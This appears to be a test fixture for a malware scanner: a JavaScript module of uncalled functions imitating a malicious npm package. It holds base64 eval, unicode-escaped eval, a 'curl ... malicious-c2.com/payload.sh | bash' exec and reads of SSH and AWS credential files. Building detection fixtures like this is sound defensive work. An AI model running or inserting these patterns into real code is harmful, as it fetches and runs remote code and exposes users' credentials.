// This package appears clean during install but contains dormant threats
// designed to be detected by static analysis

const fs = require('fs');
const { exec } = require('child_process');

// 1. eval(Buffer.from base64) - common obfuscation technique
function hiddenPayload() {
    // This would execute malicious code if called
    eval(Buffer.from('Y29uc29sZS5sb2coIk1hbGljaW91cyBwYXlsb2FkIGV4ZWN1dGVkISIp', 'base64'));
}

// 2. Large base64 encoded data (encrypted payload)
const encryptedPayload = "VGhpcyBpcyBhIHRlc3QgZW5jcnlwdGVkIHBheWxvYWQgdGhhdCB3b3VsZCBub3JtYWxseSBjb250YWluIG1hbGljaW91cyBjb2RlLiBJdCBpcyBsb25nIGVub3VnaCB0byB0cmlnZ2VyIHRoZSBzdGF0aWMgYW5hbHlzaXMgZGV0ZWN0aW9uIGZvciBsYXJnZSBiYXNlNjQgc3RyaW5ncy4gVGhpcyBpcyBqdXN0IGEgdGVzdCBidXQgaW4gYSByZWFsIGF0dGFjayB0aGlzIHdvdWxkIGNvbnRhaW4gb2JmdXNjYXRlZCBtYWx3YXJlIG9yIGVuY3J5cHRlZCBwYXlsb2FkcyB0aGF0IGFyZSBkZWNyeXB0ZWQgYW5kIGV4ZWN1dGVkIGF0IHJ1bnRpbWUuIFRoaXMgaXMgYSBjb21tb24gdGVjaG5pcXVlIHVzZWQgYnkgbWFsaWNpb3VzIGFjdG9ycyB0byBoaWRlIHRoZWlyIHBheWxvYWRzIGZyb20gc3RhdGljIGFuYWx5c2lzIHRvb2xzLg==";

// 3. Suspicious process spawning code
function backdoorFunction() {
    // This would execute system commands if called
    exec('curl -s http://malicious-c2.com/payload.sh | bash', (error, stdout, stderr) => {
        console.log('Backdoor activated');
    });
}

// 4. Credential file access patterns
function stealCredentials() {
    try {
        // This would read credentials if called
        const sshKey = fs.readFileSync('/home/user/.ssh/id_rsa', 'utf8');
        const awsCreds = fs.readFileSync('/home/user/.aws/credentials', 'utf8');
        return { sshKey, awsCreds };
    } catch (e) {
        return null;
    }
}

// 5. Heavy obfuscation with unicode escapes
const obfuscated = "\u0065\u0076\u0061\u006c\u0028\u0042\u0075\u0066\u0066\u0065\u0072\u002e\u0066\u0072\u006f\u006d\u0028\u0027\u0059\u0032\u0039\u0075\u0063\u0032\u0039\u0073\u005a\u0053\u0035\u0073\u0062\u0032\u0063\u006f\u0049\u006b\u0031\u0068\u0062\u0047\u006c\u006a\u0061\u0057\u0039\u0031\u0063\u0079\u0042\u0076\u0059\u006d\u005a\u0031\u0063\u0032\u004e\u0068\u0064\u0047\u0056\u006b\u0049\u0048\u0042\u0068\u0065\u0057\u0078\u0076\u0059\u0057\u0051\u0069\u004b\u0051\u003d\u003d\u0027\u002c\u0020\u0027\u0062\u0061\u0073\u0065\u0036\u0034\u0027\u0029\u0029";

module.exports = {
    hiddenPayload,
    backdoorFunction,
    stealCredentials,
    encryptedPayload,
    obfuscated
};